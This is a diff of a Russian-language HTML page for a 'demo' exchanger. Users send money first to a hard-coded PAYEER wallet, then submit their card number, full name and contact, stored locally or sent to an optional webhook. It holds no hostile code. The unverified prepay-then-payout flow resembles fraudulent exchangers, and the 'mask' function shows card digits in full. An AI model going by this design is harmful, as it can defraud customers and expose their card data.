@@ -3,7 +3,8 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Обменник — форма заявки</title>
+  <title>Обменник — демо (ручная обработка)</title>
+  <meta name="description" content="Демо-страница обменника с ручной обработкой заявок. Нет приёма платежей на сайте." />
   <style>
     :root{
       --bg:#0b1020; --card:#111933; --muted:#8aa0c2; --text:#e7edf8; --accent:#4aa6ff; --ok:#2ecc71; --warn:#f39c12; --err:#e74c3c;
@@ -12,67 +13,109 @@
     *{box-sizing:border-box}
     body{margin:0; font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Arial; background:linear-gradient(160deg,#0b1020,#0b1530 40%,#0d1c3d); color:var(--text)}
     .wrap{max-width:980px; margin:40px auto; padding:0 16px}
-    header{display:flex; align-items:center; justify-content:center; margin-bottom:18px}
+    header{display:flex; align-items:center; justify-content:space-between; gap:16px; margin-bottom:18px}
+    .brand{display:flex; align-items:center; gap:12px}
+    .logo{width:44px; height:44px; border-radius:12px; background:radial-gradient(circle at 30% 30%, #4aa6ff, #6c5ce7); box-shadow:var(--shadow)}
     h1{font-size:20px; margin:0}
-    .card{background:var(--card); border-radius:var(--radius); padding:18px; box-shadow:var(--shadow); border:1px solid rgba(255,255,255,.06); margin-bottom:20px}
+    .card{background:var(--card); border-radius:var(--radius); padding:18px; box-shadow:var(--shadow); border:1px solid rgba(255,255,255,.06)}
     .grid{display:grid; gap:16px}
+    @media(min-width:860px){ .grid{grid-template-columns:1.1fr .9fr} }
     label{font-size:13px; color:var(--muted); display:block; margin-bottom:6px}
     input, select, textarea{width:100%; padding:12px 14px; border-radius:12px; border:1px solid rgba(255,255,255,.08); background:#0e1630; color:var(--text); outline:none}
     input:focus, select:focus, textarea:focus{border-color:var(--accent); box-shadow:0 0 0 3px rgba(74,166,255,.2)}
     .row{display:grid; gap:12px}
     @media(min-width:640px){ .row-2{grid-template-columns:1fr 1fr} }
     .hint{font-size:12px; color:var(--muted)}
+    .copy{display:inline-flex; align-items:center; gap:8px; padding:10px 12px; border-radius:10px; background:#0e1630; border:1px solid rgba(255,255,255,.08); cursor:pointer}
+    .copy:hover{border-color:var(--accent)}
     .btn{display:inline-flex; justify-content:center; align-items:center; gap:10px; padding:14px 16px; border:none; border-radius:14px; cursor:pointer; font-weight:600}
     .btn-primary{background:var(--accent); color:#061023}
+    .btn-ghost{background:transparent; border:1px solid rgba(255,255,255,.12); color:var(--text)}
+    .spacer{height:10px}
+    .badges{display:flex; gap:10px; flex-wrap:wrap}
+    .badge{font-size:12px; padding:6px 10px; border-radius:999px; border:1px solid rgba(255,255,255,.15); color:var(--muted)}
+    .warn{color:var(--warn)}
+    .ok{color:var(--ok)}
+    .err{color:var(--err)}
     .center{text-align:center}
     .hidden{display:none}
     footer{margin:24px 0; color:var(--muted); font-size:12px; text-align:center}
+    .steps{display:grid; gap:12px}
+    .step{background:rgba(255,255,255,.03); border:1px dashed rgba(255,255,255,.08); padding:12px; border-radius:12px}
     .big{font-size:28px; font-weight:800; letter-spacing:.3px}
     .mono{font-family:ui-monospace, SFMono-Regular, Menlo, monospace}
-    .err{color:var(--err)}
-    .spacer{height:10px}
+    .success{border:1px solid rgba(46,204,113,.35); background:linear-gradient(180deg, rgba(46,204,113,.08), transparent)}
   </style>
 </head>
 <body>
   <div class="wrap">
-    <header><h1>Обменник — форма заявки</h1></header>
+    <header>
+      <div class="brand">
+        <div class="logo"></div>
+        <div>
+          <h1>Обменник — демо (ручная обработка)</h1>
+          <div class="badges">
+            <span class="badge">Нет автоплатежей</span>
+            <span class="badge">Форма заявки → ожидание</span>
+            <span class="badge">Payeer вручную</span>
+          </div>
+        </div>
+      </div>
+    </header>
 
-    <!-- Форма заявки -->
+    <!-- ЭКРАН 1: форма заявки -->
     <section id="screen-form" class="grid">
+      <div class="card">
+        <h2 style="margin-top:0">1) Переведите на наш PAYEER</h2>
+        <p>Отправьте сумму на кошелёк PAYEER и вернитесь сюда, чтобы создать заявку.</p>
+        <div class="row">
+          <label>Кошелёк PAYEER для перевода</label>
+          <div class="row row-2">
+            <input id="payeer" class="mono" value="P1133207161" readonly />
+            <button class="copy" type="button" onclick="copyPayeer()" aria-label="Скопировать кошелёк">
+              <span>Скопировать</span>
+            </button>
+          </div>
+          <span class="hint">⚠️ Переводы вы делаете на своей стороне (в приложении PAYEER). На сайте платежи не принимаются.</span>
+        </div>
+        <div class="spacer"></div>
+        <div class="steps">
+          <div class="step">1. Откройте приложение/сайт PAYEER → переведите сумму на <span class="mono">P1133207161</span>.</div>
+          <div class="step">2. Заполните форму ниже: сумма, банк получателя и реквизиты карты.</div>
+          <div class="step">3. Нажмите «Я отправил перевод». После этого появится страница ожидания.</div>
+        </div>
+      </div>
+
       <form id="orderForm" class="card" onsubmit="submitForm(event)">
-        <h2 style="margin-top:0">Введите данные для перевода</h2>
+        <h2 style="margin-top:0">2) Заполните заявку</h2>
         <div class="row row-2">
           <div>
             <label for="amount">Сумма перевода (₽)</label>
             <input id="amount" name="amount" type="number" min="100" step="1" placeholder="Напр. 3000" required />
           </div>
           <div>
-            <label for="bank">Банк или способ перевода</label>
+            <label for="bank">Банк получателя</label>
             <select id="bank" name="bank" required>
-              <option value="" disabled selected>Выберите</option>
+              <option value="" disabled selected>Выберите банк</option>
               <option>Сбербанк</option>
               <option>Тинькофф</option>
               <option>Альфа-Банк</option>
               <option>ВТБ</option>
               <option>Райффайзен</option>
               <option>Газпромбанк</option>
-              <option>Московский кредитный банк</option>
-              <option>Открытие</option>
-              <option>СПБ/СБП (по номеру телефона)</option>
               <option>Другой банк РФ</option>
             </select>
           </div>
         </div>
 
         <div class="row">
-          <label for="cardOrPhone">Номер карты или телефона</label>
-          <input id="cardOrPhone" name="cardOrPhone" placeholder="16 цифр карты или телефон для СПБ" required />
-          <span class="hint">Можно ввести 16 цифр карты или номер телефона для перевода через СПБ.</span>
+          <label for="card">Номер карты получателя (16 цифр)</label>
+          <input id="card" name="card" inputmode="numeric" pattern="[0-9]{16}" maxlength="16" placeholder="Напр. 220220******1234" required />
+          <span class="hint">Не вводите срок действия и CVV/CVC. Нам нужен только номер карты для перевода.</span>
         </div>
-
         <div class="row row-2">
           <div>
-            <label for="fio">ФИО держателя карты/аккаунта</label>
+            <label for="fio">ФИО держателя карты</label>
             <input id="fio" name="fio" placeholder="Иванов Иван Иванович" required />
           </div>
           <div>
@@ -80,96 +123,153 @@
             <input id="contact" name="contact" placeholder="Telegram @username или email" required />
           </div>
         </div>
+        <div class="row">
+          <label for="note">Комментарий (необязательно)</label>
+          <textarea id="note" name="note" rows="3" placeholder="Примечание к заявке"></textarea>
+        </div>
 
-        <button class="btn btn-primary" type="submit">Далее →</button>
+        <div class="row">
+          <label class="hint">
+            <input type="checkbox" id="confirmSend" required /> Я подтверждаю, что отправил перевод на PAYEER <span class="mono">P1133207161</span>.
+          </label>
+          <label class="hint">
+            <input type="checkbox" id="agree" required /> Я согласен с правилами сервиса и политикой конфиденциальности.
+          </label>
+        </div>
+
+        <button class="btn btn-primary" type="submit">Я отправил перевод → создать заявку</button>
         <div id="errorBox" class="hint err"></div>
       </form>
     </section>
 
-    <!-- Экран инструкции по переводу -->
+    <!-- ЭКРАН 2: ожидание -->
     <section id="screen-wait" class="card hidden center">
-      <div class="big">Инструкция по переводу</div>
-      <p>Отправьте сумму на наш PAYEER <span class="mono">P1133207161</span> и ожидайте подтверждения.</p>
+      <div class="big">Заявка создана ✅</div>
+      <p>Спасибо! Мы получили вашу заявку и проверяем перевод. Обычно это занимает 5–20 минут.</p>
       <div id="ticket" class="mono" style="font-size:15px; opacity:.9"></div>
       <div class="spacer"></div>
-      <button class="btn btn-primary" onclick="backHome()">Создать новую заявку</button>
+      <div class="row row-2" style="max-width:680px; margin:0 auto">
+        <div class="step success">
+          <b>Что дальше?</b><br>
+          Подтвердим получение перевода и выполним оплату на указанную карту.
+        </div>
+        <div class="step">
+          <b>Если есть вопросы</b><br>
+          Напишите нам: <span id="supportContact" class="mono">@support</span>
+        </div>
+      </div>
+      <div class="spacer"></div>
+      <button class="btn btn-ghost" onclick="backHome()">Создать новую заявку</button>
     </section>
 
     <footer>
-      <div>Все операции обрабатываются вручную. Платежи на сайте не принимаются.</div>
+      <div>Демо-версия. Платежи не принимаются на сайте. Все операции обрабатываются вручную.</div>
+      <div style="margin-top:6px">Совет по безопасности: не запрашивайте у клиентов CVV/срок действия карты. Храните данные заявок безопасно.</div>
     </footer>
   </div>
 
   <script>
-    const SETTINGS = { payeerWallet: 'P1133207161' };
+    // === Настройки ===
+    const SETTINGS = {
+      payeerWallet: 'P1133207161',
+      // Укажи свой контакт для поддержки (телеграм/почта)
+      support: '@support',
+      // Если есть вебхук (например, в Telegram Bot API, Formspree, Make, n8n), укажи URL ниже.
+      // Если оставить пустым, заявка просто сохранится в localStorage и покажется экран ожидания.
+      webhookUrl: ''
+    }
+
+    // Инициализация контакта поддержки
+    document.getElementById('supportContact').textContent = SETTINGS.support
+
+    // Копирование PAYEER
+    function copyPayeer(){
+      const el = document.getElementById('payeer')
+      el.select(); el.setSelectionRange(0, el.value.length)
+      document.execCommand('copy')
+      alert('Кошелёк скопирован: ' + el.value)
+    }
+
+    // Валидация простая маска номера карты (только цифры)
+    const cardInput = document.getElementById('card')
+    cardInput.addEventListener('input', () => {
+      cardInput.value = cardInput.value.replace(/\D/g,'').slice(0,16)
+    })
 
     function genId(){
-      const t = Date.now().toString(36);
-      const r = Math.random().toString(36).slice(2,7);
-      return ('ORD-' + t + '-' + r).toUpperCase();
+      const t = Date.now().toString(36)
+      const r = Math.random().toString(36).slice(2,7)
+      return ('ORD-' + t + '-' + r).toUpperCase()
     }
 
     function formDataToObj(form){
-      const fd = new FormData(form);
-      return Object.fromEntries(fd.entries());
+      const fd = new FormData(form)
+      return Object.fromEntries(fd.entries())
     }
 
-    function validateCardOrPhone(value, bank){
-      const digits = value.replace(/\D/g, '');
-      if(bank === 'СПБ/СБП (по номеру телефона)'){
-        if(digits.length < 10 || digits.length > 15){
-          return 'Номер телефона для СПБ должен содержать от 10 до 15 цифр.';
-        }
-      } else {
-        if(digits.length !== 16){
-          return 'Номер карты должен содержать ровно 16 цифр.';
-        }
+    async function submitForm(e){
+      e.preventDefault()
+      const err = document.getElementById('errorBox'); err.textContent=''
+      const form = document.getElementById('orderForm')
+
+      // Мини-проверки
+      if(!document.getElementById('confirmSend').checked){
+        err.textContent = 'Подтвердите, что вы уже отправили перевод на PAYEER.'; return
       }
-      return '';
+      if(!document.getElementById('agree').checked){
+        err.textContent = 'Нужно согласиться с правилами сервиса.'; return
+      }
+
+      const data = formDataToObj(form)
+      const orderId = genId()
+      const payload = {
+        orderId,
+        createdAt: new Date().toISOString(),
+        payeer: SETTINGS.payeerWallet,
+        ...data
+      }
+
+      try{
+        // Отправка на вебхук, если указан
+        if(SETTINGS.webhookUrl){
+          await fetch(SETTINGS.webhookUrl, {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify(payload)
+          })
+        }
+        // Резервная запись локально (для видимости пользователю)
+        const list = JSON.parse(localStorage.getItem('orders')||'[]')
+        list.push(payload)
+        localStorage.setItem('orders', JSON.stringify(list))
+
+        // Переход на экран ожидания
+        showWait(orderId, payload)
+      }catch(ex){
+        console.error(ex)
+        err.textContent = 'Не удалось отправить заявку. Попробуйте ещё раз или свяжитесь с поддержкой.'
+      }
     }
 
-    function submitForm(e){
-      e.preventDefault();
-      const err = document.getElementById('errorBox');
-      err.textContent='';
-
-      const form = document.getElementById('orderForm');
-      const data = formDataToObj(form);
-
-      const validationMsg = validateCardOrPhone(data.cardOrPhone, data.bank);
-      if(validationMsg){
-        err.textContent = validationMsg;
-        return;
-      }
-
-      const orderId = genId();
-      const payload = { orderId, createdAt: new Date().toISOString(), payeer: SETTINGS.payeerWallet, ...data };
-      const details = `Номер заявки: ${orderId}\nСумма: ${payload.amount} ₽\nБанк/способ: ${payload.bank}\nКарта/Телефон: ${payload.cardOrPhone}\nФИО: ${payload.fio}\nКонтакт: ${payload.contact}`;
-      
-      document.getElementById('ticket').textContent = details;
-      document.getElementById('screen-form').classList.add('hidden');
-      document.getElementById('screen-wait').classList.remove('hidden');
-      window.scrollTo({top:0, behavior:'smooth'});
-
-      const list = JSON.parse(localStorage.getItem('orders')||'[]');
-      list.push(payload);
-      localStorage.setItem('orders', JSON.stringify(list));
+    function showWait(orderId, payload){
+      document.getElementById('screen-form').classList.add('hidden')
+      document.getElementById('screen-wait').classList.remove('hidden')
+      const details = `Номер заявки: ${orderId}\nСумма: ${payload.amount} ₽\nБанк: ${payload.bank}\nКарта: ${mask(payload.card)}\nФИО: ${payload.fio}\nКонтакт: ${payload.contact}`
+      document.getElementById('ticket').textContent = details
+      window.scrollTo({top:0, behavior:'smooth'})
     }
 
     function backHome(){
-      document.getElementById('screen-wait').classList.add('hidden');
-      document.getElementById('screen-form').classList.remove('hidden');
-      document.getElementById('orderForm').reset();
+      document.getElementById('screen-wait').classList.add('hidden')
+      document.getElementById('screen-form').classList.remove('hidden')
+      document.getElementById('orderForm').reset()
     }
 
-    const cardInput = document.getElementById('cardOrPhone');
-    cardInput.addEventListener('input', e => {
-      let digits = e.target.value.replace(/\D/g,'');
-      if(document.getElementById('bank').value !== 'СПБ/СБП (по номеру телефона)'){
-        digits = digits.slice(0,16);
-        e.target.value = digits.replace(/(.{4})/g, '$1 ').trim();
-      }
-    });
+    function mask(card){
+      if(!card) return ''
+      const s = String(card).padStart(16,'•')
+      return s.slice(0,4) + ' ' + s.slice(4,8) + ' ' + s.slice(8,12) + ' ' + s.slice(12)
+    }
   </script>
 </body>
 </html>
